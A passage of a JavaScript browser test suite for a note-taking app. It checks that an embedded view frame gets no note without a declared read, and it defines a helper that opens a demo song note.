    await openNote(b, f.origin, ['Inbox'], 'Gift idea', false);
    await until(async () => (await mark(b, 'first'))?.state === 'ready', 20000, 'the first island\'s view ready');
    const fc = await frameOf(b, 'first');
    const handed = JSON.parse(await until(() => b.evalIn(fc, 'document.body.dataset.report'), 10000, 'its props'));
    assert.equal(handed.note, null, 'no note without a declared read');
  } finally { await b.close(); f.close(); n.close(); }
});

/// The song note without waiting for its view (a tampered bundle draws none).
async function openNoteOnly(w) {
  const b = w.b;
  await b.go(`${w.f.origin}/app/?demo`);
  await until(() => b.eval(`!!document.querySelector('[data-testid=note-text]')`), 60000, 'the demo');
  const click = (txt) => b.eval(`(() => { const all = [...document.querySelectorAll('*')].filter((e) => e.children.length === 0 && e.textContent.trim() === ${JSON.stringify(txt)}); const e = all[all.length - 1]; if (!e) return false; (e.closest('button,[role=treeitem],[role=button],a,li,div') || e).click(); return true; })()`);
  await until(() => click('Songs'), 10000, 'the Songs folder');
  await sleep(300);
  await until(() => click('Amazing Grace'), 10000, 'the song note');
  await until(() => b.eval(`!!document.querySelector('[data-note="Songs/Amazing Grace.md"]')`), 15000, 'the song note open');
}
